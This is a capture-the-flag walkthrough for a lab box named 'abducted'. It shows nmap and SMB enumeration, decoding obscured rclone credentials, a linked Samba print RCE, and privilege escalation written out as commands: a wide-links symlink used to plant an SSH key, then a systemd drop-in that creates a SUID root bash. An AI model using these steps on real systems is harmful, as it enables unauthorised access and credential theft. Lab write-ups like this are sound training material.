# abducted

```
Nmap scan report for 10.129.32.213
Host is up, received reset ttl 63 (0.068s latency).
Scanned at 2026-06-20 14:03:21 EDT for 2401s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 12027/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 28218/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 56390/udp): CLEAN (Failed to receive data)
|   Check 4 (port 57880/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-06-20T18:43:20
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: ABDUCTED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ABDUCTED<00>         Flags: <unique><active>
|   ABDUCTED<03>         Flags: <unique><active>
|   ABDUCTED<20>         Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

running some samba shares, netbios, servername `ABDUCTED`. how to get share access??

```
rpcclient $> netshareenumall
netname: HP-Reception
        remark: Reception printer
        path:   C:\var\spool\samba
        password:       
netname: projects
        remark: Hartley Group Project Files
        path:   C:\srv\projects
        password:       
netname: transfer
        remark: Staff file transfer
        path:   C:\srv\transfer
        password:       
netname: IPC$
        remark: IPC Service (Hartley Group Document Services)
        path:   C:\tmp
        password:
```

"Hartley Group Document Services"

find a user `scott` with rpcclient enumdomusers
querydispinfo : Scott Mercer
queryuser/querygroup : ordinary users

enum4linux reveals `marcus` user

there is a recent critical rce in the samba printing subsystem. [CVE-2026-4480](https://nvd.nist.gov/vuln/detail/CVE-2026-4480)

a specially crafted print job description can use shell chars to execute arbitrary commands.

creator of the box has a poc [here](https://github.com/TheCyberGeek/CVE-2026-4480-PoC)

we land as `nobody`. readable rclone.conf and sync.sh in `/opt/offsite-backup`

there is a password for `svc-backup` user and the script rclones the `projects` share we found earlier to a host `backup.hartley-group.internal`

rclone passwords are obscured (not encrypted) in the config files, you can just `rclone reveal <obscured>` to find the plaintext

this password is reused for scott. ssh in -> user

---

the samba config has `wide links` enabled on `transfer` , and `force user` to marcus, which means the daemon will follow any symlinks in the share outside of the share's tree, and every action is performed as user `marcus`. since `scott` owns `/srv/transfer`, we can make a symlink to `marcus`'s home directory, and perform any file actions we want (i.e add an ssh key) via smb

```bash
$ ssh-keygen -f /tmp/key
$ ln -s /home/marcus /srv/transfer/marcus
```

```
smbclient -U 'scott%PASS' //127.0.0.1/transfer
mkdir .ssh
cd .ssh
put /tmp/key.pub authorized_keys
```

marcus's account is in `operators` group. that group has write to the `/etc/systemd/system/smbd.service.d` systemd drop-in directory. which means we can merge any command we want into the service file of smbd. (ExecStartPre)

but, we also have to restart the service. you can enumerate which actions `polkit` will allow without authenticating, and it will reveal you can `systemctl daemon-reload`

it turns out you can also restart the smbd service, but it's conditional on the specific unit being passed, which is why it doesn't show up from the output of this command:

```bash
$ for action in $(pkaction); do
  pkcheck --action-id "$action" --process $$ 2>/dev/null && echo "$action"
done
```

what we'll do is make a suid copy of bash owned by root, executable by anyone

```ini
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/pwn
ExecStartPre=/bin/chmod 4755 /tmp/pwn
```

then just daemon-reload and restart smbd

pass `-p` to the resulting shell to avoid resetting the euid
